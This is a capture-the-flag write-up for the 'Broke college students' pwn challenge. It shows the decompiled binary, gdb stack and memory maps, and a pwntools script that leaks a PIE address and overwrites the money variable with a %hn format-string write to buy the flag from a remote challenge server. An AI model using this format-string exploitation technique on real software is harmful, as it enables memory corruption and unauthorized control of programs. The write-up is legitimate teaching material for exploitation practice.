# Broke college students

## IDA

This binary has *a lot* of functions, beware

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi

  puts("Welcome to the College Applications!");
  v3 = _bss_start;
  fflush(_bss_start);
  MONEY = 5000;
  while ( 1 )
    menu(v3, argv);
}

unsigned __int64 menu()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( MONEY <= 0 )
  {
    puts("Now what will your parents think of you now!\n");
    fflush(_bss_start);
    quit();
  }
  puts("What would you like to do?");
  printf("You have %d money.\n", (unsigned int)MONEY);
  puts("===========================");
  puts("1) Scholarship Application Portal");
  puts("2) Collegeboard Website");
  puts("3) Quit");
  puts("===========================");
  fflush(_bss_start);
  printf("Choice: ");
  fflush(_bss_start);
  __isoc99_scanf("%d", &v1);
  fflush(_bss_start);
  if ( v1 == 2 )
  {
    shop();
  }
  else
  {
    if ( v1 != 1 )
      quit();
    safari();
  }
  return v2 - __readfsqword(0x28u);
}

void __noreturn quit()
{
  puts("Maybe we'll just all settle for trade school");
  fflush(_bss_start);
  exit(0);
}

unsigned __int64 battle()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("You encountered some kind of wild application essay reader thing!");
  fflush(_bss_start);
  while ( 1 )
  {
    do
    {
      if ( rand() % 20 <= 1 )
      {
        puts("OH NO IT RAN AWAY!");
        fflush(_bss_start);
        return v2 - __readfsqword(0x28u);
      }
      puts("What do you want to do?");
      putchar(10);
      puts("1) Apply!");
      puts("2) Run away and follow your dreams of art school!");
      fflush(_bss_start);
      printf("CHOOSE: ");
      fflush(_bss_start);
      __isoc99_scanf("%d", &v1);
      fflush(_bss_start);
      if ( v1 == 2 )
      {
        puts("Guess you weren't legacy");
        fflush(_bss_start);
        return v2 - __readfsqword(0x28u);
      }
    }
    while ( v1 != 1 );
    if ( rand() % 10 > 3 )
      break;
    printf("That didn't work...");
    fflush(_bss_start);
  }
  puts("YOU GOT IT!");
  catch();
  return v2 - __readfsqword(0x28u);
}

unsigned __int64 catch()
{
  char format[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("You caught a wild scholarship! These are rare.");
  puts("What is it's name?");
  printf("name: ");
  fflush(_bss_start);
  __isoc99_scanf("%s", format);
  puts("Maybe now you'll be able to afford a single quarter of university! The scholarship you got was: \n");
  printf(format);
  fflush(_bss_start);
  return v2 - __readfsqword(0x28u);
}

unsigned __int64 safari()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Welcome to the College Applications!");
  puts("Would you like to delve into scholarship hunting?");
  puts("It's only $500 and you have a one in a million chance of winning. What a steal!");
  puts("===========================");
  display_money();
  puts("1) Yes ($500)");
  puts("2) No");
  puts("===========================");
  fflush(_bss_start);
  printf("Choose: ");
  __isoc99_scanf("%d", &v1);
  fflush(_bss_start);
  if ( v1 == 1 )
  {
    MONEY -= 500;
    battle();
  }
  else if ( v1 == 2 )
  {
    puts("Okay maybe next time then...");
    fflush(_bss_start);
  }
  return v2 - __readfsqword(0x28u);
}

unsigned __int64 shop()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Welcome to the Collegeboard website!");
  display_money();
  puts("1) Send a SINGLE AP Test Score ($1000000)");
  puts("2) Buy FLAG ($9999999)");
  fflush(_bss_start);
  printf("BUY ITEM (0 to cancel): ");
  __isoc99_scanf("%d", &v1);
  fflush(_bss_start);
  if ( v1 == 1 )
  {
    if ( MONEY > 999999 )
    {
      MONEY -= 1000000;
      puts("You got to skip one general ed... but at what cost");
LABEL_8:
      fflush(_bss_start);
      return v2 - __readfsqword(0x28u);
    }
LABEL_6:
    printf("Hmm doesn't look like you have enough money for that...");
    goto LABEL_8;
  }
  if ( v1 == 2 )
  {
    if ( MONEY > 9999998 )
    {
      MONEY -= 9999999;
      puts("Ooh wow so what are you Jeffrey Bezos' son?");
      system("cat flag.txt");
      goto LABEL_8;
    }
    goto LABEL_6;
  }
  return v2 - __readfsqword(0x28u);
}

int display_money()
{
  printf("You have %d money.\n", (unsigned int)MONEY);
  return fflush(_bss_start);
}
```

## Analysis

We see that we can "buy" the flag for a huge amount of money, but
unfortunately we only have 5000. We also see that we have a `printf(format)` inside the `catch` function,
and we control the format. To get there we just need to go through some menu items,
and based on a random number we can get the scholarship (or, the call to the vulnerable printf). 
The probability of *not* getting there is tiny (`rand() % 20 <= 1` and `rand() % 10 <= 3`), but 
we can just restart the program or go into that menu again lol.

Let's checksec first:
```
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

PIE is enabled, so we need to leak an address in any situation.

So, what can we do with that printf? We can do arbitrary reads and writes.
One solution is leak the stack canary and some address from libc and
jump to `system("/bin/sh)`, but if we can just buy the flag from the binary, 
why overcomplicate things? We just need to leak a binary address, modify the money global variable
and choose the right menu option.

Let's see what we can leak. Set a breakpoint before the vulnerable printf:

```
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ea99b7 (<__GI___libc_write+23>:	cmp    rax,0xfffffffffffff000)
RDX: 0x1 
RSI: 0x1 
RDI: 0x7fffffffe350 --> 0x41414141414141 ('AAAAAAA')
RBP: 0x7fffffffe370 --> 0x7fffffffe390 --> 0x7fffffffe3b0 --> 0x7fffffffe3d0 --> 0x7fffffffe3e0 --> 0x1 
RSP: 0x7fffffffe350 --> 0x41414141414141 ('AAAAAAA')
RIP: 0x5555555556cc (<catch+131>:	call   0x555555555110 <printf@plt>)
R8 : 0x0 
R9 : 0x7ffff7faa260 --> 0x8 
R10: 0x0 
R11: 0x246 
R12: 0x7fffffffe508 --> 0x7fffffffe75b ("/home/toma/broke/brokecollegestudents")
R13: 0x5555555558f6 (<main>:	endbr64)
R14: 0x0 
R15: 0x7ffff7ffbc40 --> 0x50d0e00000000
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555556c0 <catch+119>:	lea    rax,[rbp-0x20]
   0x5555555556c4 <catch+123>:	mov    rdi,rax
   0x5555555556c7 <catch+126>:	mov    eax,0x0
=> 0x5555555556cc <catch+131>:	call   0x555555555110 <printf@plt>
   0x5555555556d1 <catch+136>:	mov    rax,QWORD PTR [rip+0x2938]        # 0x555555558010 <stdout@GLIBC_2.2.5>
   0x5555555556d8 <catch+143>:	mov    rdi,rax
   0x5555555556db <catch+146>:	call   0x555555555120 <fflush@plt>
   0x5555555556e0 <catch+151>:	nop
Guessed arguments:
arg[0]: 0x7fffffffe350 --> 0x41414141414141 ('AAAAAAA')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe350 --> 0x41414141414141 ('AAAAAAA')
0008| 0x7fffffffe358 --> 0x7fffffffe390 --> 0x7fffffffe3b0 --> 0x7fffffffe3d0 --> 0x7fffffffe3e0 --> 0x1 
0016| 0x7fffffffe360 --> 0x7fffffffe508 --> 0x7fffffffe75b ("/home/toma/broke/brokecollegestudents")
0024| 0x7fffffffe368 --> 0xc676032df64f7800 
0032| 0x7fffffffe370 --> 0x7fffffffe390 --> 0x7fffffffe3b0 --> 0x7fffffffe3d0 --> 0x7fffffffe3e0 --> 0x1 
0040| 0x7fffffffe378 --> 0x55555555588c (<battle+405>:	jmp    0x5555555558b3 <battle+444>)
0048| 0x7fffffffe380 --> 0x1ffffe508 
0056| 0x7fffffffe388 --> 0xc676032df64f7800 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00005555555556cc in catch ()
gdb-peda$ 
```

We can leak the return address of the function then calculate the base of main afterwards.
On the stack it's the 6th element, +5 registers because we are on 64 bit (see the writeup for tweetybirb
for an explanation on that), so it's the 11th argument. Let's do it:

```py
from pwn import *

context.log_level = 'debug'
context.timeout = 1

r = process("./brokecollegestudents")
r.clean()
r.sendline(b"1")
r.clean()
r.sendline(b"1")
r.clean()
r.sendline(b"1")
r.clean()
r.sendline(b"%11$lx")
r.recvline()
r.recvline()
leak = r.recvline()
leak = int(leak.strip().split(b"What")[0], 16)
base = leak - 0x188c
money = base + 0x401c
log.success(f"money = {hex(money)}")
```

```
[+] Starting local process './brokecollegestudents' argv=[b'./brokecollegestudents'] : pid 3031
[DEBUG] Received 0xd7 bytes:
    b'Welcome to the College Applications!\n'
    b'What would you like to do?\n'
    b'You have 5000 money.\n'
    b'===========================\n'
    b'1) Scholarship Application Portal\n'
    b'2) Collegeboard Website\n'
    b'3) Quit\n'
    b'===========================\n'
    b'Choice: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x108 bytes:
    b'Welcome to the College Applications!\n'
    b'Would you like to delve into scholarship hunting?\n'
    b"It's only $500 and you have a one in a million chance of winning. What a steal!\n"
    b'===========================\n'
    b'You have 5000 money.\n'
    b'1) Yes ($500)\n'
    b'2) No\n'
    b'===========================\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0xa7 bytes:
    b'Choose: You encountered some kind of wild application essay reader thing!\n'
    b'What do you want to do?\n'
    b'\n'
    b'1) Apply!\n'
    b'2) Run away and follow your dreams of art school!\n'
    b'CHOOSE: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x54 bytes:
    b'YOU GOT IT!\n'
    b'You caught a wild scholarship! These are rare.\n'
    b"What is it's name?\n"
    b'name: '
[DEBUG] Sent 0x7 bytes:
    b'%11$lx\n'
[DEBUG] Received 0x120 bytes:
    b"Maybe now you'll be able to afford a single quarter of university! The scholarship you got was: \n"
    b'\n'
    b'55aed59d388cWhat would you like to do?\n'
    b'You have 4500 money.\n'
    b'===========================\n'
    b'1) Scholarship Application Portal\n'
    b'2) Collegeboard Website\n'
    b'3) Quit\n'
    b'===========================\n'
    b'Choice: '
[+] money = 0x55aed59d601c
```

We have our leak. Let's see the binary base in gdb (gdb automatically disables aslr for us).
In the code snippet above the address of the return address is 0x55555555588c, let's see the mapped address spaces:

```
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555555000     0x1000        0x0 /home/toma/broke/brokecollegestudents
      0x555555555000     0x555555556000     0x1000     0x1000 /home/toma/broke/brokecollegestudents
      0x555555556000     0x555555557000     0x1000     0x2000 /home/toma/broke/brokecollegestudents
      0x555555557000     0x555555558000     0x1000     0x2000 /home/toma/broke/brokecollegestudents
      0x555555558000     0x555555559000     0x1000     0x3000 /home/toma/broke/brokecollegestudents
      0x555555559000     0x55555557a000    0x21000        0x0 [heap]
      0x7ffff7d8f000     0x7ffff7d92000     0x3000        0x0 
      0x7ffff7d92000     0x7ffff7dbe000    0x2c000        0x0 /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7dbe000     0x7ffff7f52000   0x194000    0x2c000 /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7f52000     0x7ffff7fa6000    0x54000   0x1c0000 /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7fa6000     0x7ffff7fa7000     0x1000   0x214000 /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7fa7000     0x7ffff7faa000     0x3000   0x214000 /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7faa000     0x7ffff7fad000     0x3000   0x217000 /usr/lib/x86_64-linux-gnu/libc.so.6
      0x7ffff7fad000     0x7ffff7fba000     0xd000        0x0 
      0x7ffff7fc0000     0x7ffff7fc2000     0x2000        0x0 
      0x7ffff7fc2000     0x7ffff7fc6000     0x4000        0x0 [vvar]
      0x7ffff7fc6000     0x7ffff7fc8000     0x2000        0x0 [vdso]
      0x7ffff7fc8000     0x7ffff7fc9000     0x1000        0x0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
      0x7ffff7fc9000     0x7ffff7ff1000    0x28000     0x1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
      0x7ffff7ff1000     0x7ffff7ffb000     0xa000    0x29000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
      0x7ffff7ffb000     0x7ffff7ffd000     0x2000    0x32000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
      0x7ffff7ffd000     0x7ffff7fff000     0x2000    0x34000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
```

Our binary is mapped at 0x555555554000 (in gdb), so the leak is at 0x55555555588c - 0x555555554000 = 0x188c offset.
So if we have the leak, subtract 0x188c to get the binary base. What about the money variable?

```
gdb-peda$ p &MONEY
$1 = (<data variable, no debug info> *) 0x55555555801c <MONEY>
```

The offset is 0x55555555801c - 0x555555554000 = 0x401c.

We have our leak, let's overwrite the money variable. We can use printf's %n format specifier
to write to an address the number of characters written so far. Typically, it's used as `printf("something %n", &nr)`,
but what's stopping us to write to a random location? We just need to be careful about the positioning and the amount of printed characters.
We need 9999999 money, but we won't write 9999999 characters unless you want to spend the night looking at your screen while
it's printing stuff. But we can overwrite the high part of the variable by writing only 2 bytes (%hn).
The final format string is as follows:
`b"BBBBBB%153d%8$hn" + p64(money + 2)`
Let's break it down:
- `hn` because we want to write only 2 bytes
- `153` because it's a random number that after overwriting gives us more money than needed
- `8$` because the `hn` has to point at the address that we are concatenating
- random 'B's for alignment (so that it's aligned to be pointed by `hn`)

After that we just need to select the right menu.

Final script:

```py
from pwn import *

context.log_level = 'debug'

r = remote("143.198.184.186", 5001)
r.clean()
r.sendline(b"1")
r.clean()
r.sendline(b"1")
r.clean()
r.sendline(b"1")
r.clean()
r.sendline(b"%11$lx")
r.recvline()
r.recvline()
leak = r.recvline()
leak = int(leak.strip().split(b"What")[0], 16)
base = leak - 0x188c
money = base + 0x401c
log.success(f"money = {hex(money)}")

r.clean()
r.sendline(b"1")
r.clean()
r.sendline(b"1")
r.clean()
r.sendline(b"1")
r.clean()
r.sendline(b"BBBBBB%153d%8$hn" + p64(money+2))
r.clean()
r.sendline(b"2")
r.clean()
r.sendline(b"2")
r.clean()
```

```
➜  broke python3 exploit.py
[+] Opening connection to 143.198.184.186 on port 5001: Done
[DEBUG] Received 0xd7 bytes:
    b'Welcome to the College Applications!\n'
    b'What would you like to do?\n'
    b'You have 5000 money.\n'
    b'===========================\n'
    b'1) Scholarship Application Portal\n'
    b'2) Collegeboard Website\n'
    b'3) Quit\n'
    b'===========================\n'
    b'Choice: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x108 bytes:
    b'Welcome to the College Applications!\n'
    b'Would you like to delve into scholarship hunting?\n'
    b"It's only $500 and you have a one in a million chance of winning. What a steal!\n"
    b'===========================\n'
    b'You have 5000 money.\n'
    b'1) Yes ($500)\n'
    b'2) No\n'
    b'===========================\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0xa7 bytes:
    b'Choose: You encountered some kind of wild application essay reader thing!\n'
    b'What do you want to do?\n'
    b'\n'
    b'1) Apply!\n'
    b'2) Run away and follow your dreams of art school!\n'
    b'CHOOSE: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x54 bytes:
    b'YOU GOT IT!\n'
    b'You caught a wild scholarship! These are rare.\n'
    b"What is it's name?\n"
    b'name: '
[DEBUG] Sent 0x7 bytes:
    b'%11$lx\n'
[DEBUG] Received 0x120 bytes:
    b"Maybe now you'll be able to afford a single quarter of university! The scholarship you got was: \n"
    b'\n'
    b'5650ae91888cWhat would you like to do?\n'
    b'You have 4500 money.\n'
    b'===========================\n'
    b'1) Scholarship Application Portal\n'
    b'2) Collegeboard Website\n'
    b'3) Quit\n'
    b'===========================\n'
    b'Choice: '
[+] money = 0x5650ae91b01c
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x108 bytes:
    b'Welcome to the College Applications!\n'
    b'Would you like to delve into scholarship hunting?\n'
    b"It's only $500 and you have a one in a million chance of winning. What a steal!\n"
    b'===========================\n'
    b'You have 4500 money.\n'
    b'1) Yes ($500)\n'
    b'2) No\n'
    b'===========================\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0xa7 bytes:
    b'Choose: You encountered some kind of wild application essay reader thing!\n'
    b'What do you want to do?\n'
    b'\n'
    b'1) Apply!\n'
    b'2) Run away and follow your dreams of art school!\n'
    b'CHOOSE: '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x54 bytes:
    b'YOU GOT IT!\n'
    b'You caught a wild scholarship! These are rare.\n'
    b"What is it's name?\n"
    b'name: '
[DEBUG] Sent 0x19 bytes:
    00000000  42 42 42 42  42 42 25 31  35 33 64 25  38 24 68 6e  │BBBB│BB%1│53d%│8$hn│
    00000010  1e b0 91 ae  50 56 00 00  0a                        │····│PV··│·│
    00000019
[DEBUG] Received 0x1bd bytes:
    00000000  4d 61 79 62  65 20 6e 6f  77 20 79 6f  75 27 6c 6c  │Mayb│e no│w yo│u'll│
    00000010  20 62 65 20  61 62 6c 65  20 74 6f 20  61 66 66 6f  │ be │able│ to │affo│
    00000020  72 64 20 61  20 73 69 6e  67 6c 65 20  71 75 61 72  │rd a│ sin│gle │quar│
    00000030  74 65 72 20  6f 66 20 75  6e 69 76 65  72 73 69 74  │ter │of u│nive│rsit│
    00000040  79 21 20 54  68 65 20 73  63 68 6f 6c  61 72 73 68  │y! T│he s│chol│arsh│
    00000050  69 70 20 79  6f 75 20 67  6f 74 20 77  61 73 3a 20  │ip y│ou g│ot w│as: │
    00000060  0a 0a 42 42  42 42 42 42  20 20 20 20  20 20 20 20  │··BB│BBBB│    │    │
    00000070  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    *
    000000f0  20 20 20 20  20 20 2d 31  33 36 36 31  39 31 32 37  │    │  -1│3661│9127│
    00000100  32 1e b0 91  ae 50 56 57  68 61 74 20  77 6f 75 6c  │2···│·PVW│hat │woul│
    00000110  64 20 79 6f  75 20 6c 69  6b 65 20 74  6f 20 64 6f  │d yo│u li│ke t│o do│
    00000120  3f 0a 59 6f  75 20 68 61  76 65 20 31  30 34 32 34  │?·Yo│u ha│ve 1│0424│
    00000130  32 32 34 20  6d 6f 6e 65  79 2e 0a 3d  3d 3d 3d 3d  │224 │mone│y.·=│====│
    00000140  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │====│====│====│====│
    00000150  3d 3d 3d 3d  3d 3d 0a 31  29 20 53 63  68 6f 6c 61  │====│==·1│) Sc│hola│
    00000160  72 73 68 69  70 20 41 70  70 6c 69 63  61 74 69 6f  │rshi│p Ap│plic│atio│
    00000170  6e 20 50 6f  72 74 61 6c  0a 32 29 20  43 6f 6c 6c  │n Po│rtal│·2) │Coll│
    00000180  65 67 65 62  6f 61 72 64  20 57 65 62  73 69 74 65  │egeb│oard│ Web│site│
    00000190  0a 33 29 20  51 75 69 74  0a 3d 3d 3d  3d 3d 3d 3d  │·3) │Quit│·===│====│
    000001a0  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │====│====│====│====│
    000001b0  3d 3d 3d 3d  0a 43 68 6f  69 63 65 3a  20           │====│·Cho│ice:│ │
    000001bd
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x7f bytes:
    b'Welcome to the Collegeboard website!\n'
    b'You have 10424224 money.\n'
    b'1) Send a SINGLE AP Test Score ($1000000)\n'
    b'2) Buy FLAG ($9999999)\n'
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x18 bytes:
    b'BUY ITEM (0 to cancel): '
[DEBUG] Received 0x11d bytes:
    b'kqctf{did_you_resort_to_selling_NFTs_for_college_money_????}\n'
    b"Ooh wow so what are you Jeffrey Bezos' son?\n"
    b'What would you like to do?\n'
    b'You have 424225 money.\n'
    b'===========================\n'
    b'1) Scholarship Application Portal\n'
    b'2) Collegeboard Website\n'
    b'3) Quit\n'
    b'===========================\n'
    b'Choice: '
[*] Closed connection to 143.198.184.186 port 5001
```

Flag: `kqctf{did_you_resort_to_selling_NFTs_for_college_money_????}`